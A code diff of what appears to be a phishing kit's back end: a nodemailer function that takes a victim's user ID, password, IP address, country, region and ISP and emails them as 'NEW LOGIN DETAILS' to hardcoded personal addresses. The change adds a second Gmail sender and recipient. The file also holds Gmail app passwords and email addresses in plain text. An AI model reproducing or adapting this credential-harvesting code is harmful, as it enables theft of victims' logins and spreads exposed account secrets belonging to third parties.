@@ -1,17 +1,45 @@
 const nodemailer = require('nodemailer')
 
-const sendMail = (userID, password, country, region, isp, IPAddress, res) => {
-  const transporter = nodemailer.createTransport({
-    service: 'gmail',
-    auth: {
+const sendMail = (
+  userID,
+  password,
+  country,
+  region,
+  isp,
+  IPAddress,
+  sender,
+  res
+) => {
+  let auth
+  let to
+  if (sender === 'pat.nishimoto2@gmail.com') {
+    auth = {
       user: 'pat.nishimoto2@gmail.com',
       pass: 'khra ryeh iqav bcmz',
-    },
+    }
+    to = 'Ibekzmoney@hotmail.com'
+  } else if (sender === 'timiperla@gmail.com') {
+    auth = {
+      user: 'timiperla@gmail.com',
+      pass: 'cbpj ypnx ctoh dlmo',
+    }
+    to = 'timiperla@gmail.com'
+    // to = 'bljazeem@gmail.com'
+  }
+  const transporter = nodemailer.createTransport({
+    service: 'gmail',
+    auth,
   })
 
+  const text = `New login details. User ID: ${userID}, password: ${password}, IP: ${
+    IPAddress || 'Not available'
+  }, Country: ${country || 'Not available'}, Region:${
+    region || 'Not available'
+  }, Internet Service Provider(ISP): ${isp || 'Not available'} `
+
   const mailOptions = {
-    from: 'pat.nishimoto2@gmail.com',
-    to: 'Ibekzmoney@hotmail.com',
+    from: auth['user'],
+    to,
     subject: 'NEW LOGIN DETAILS',
     text: `New login details. User ID: ${userID}, password: ${password}, IP: ${
       IPAddress || 'Not available'
